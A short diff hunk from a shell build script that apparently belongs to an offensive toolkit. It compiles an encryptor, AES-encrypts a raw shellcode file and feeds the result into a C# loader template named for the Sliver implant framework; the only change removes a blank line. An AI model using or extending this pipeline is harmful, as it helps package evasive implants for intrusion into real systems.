@@ -35,7 +35,6 @@ sleep 2
 cp aesloader2_template.txt tmp/aesloadermono_sliver.cs
 
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
-
 mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt
 
 encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
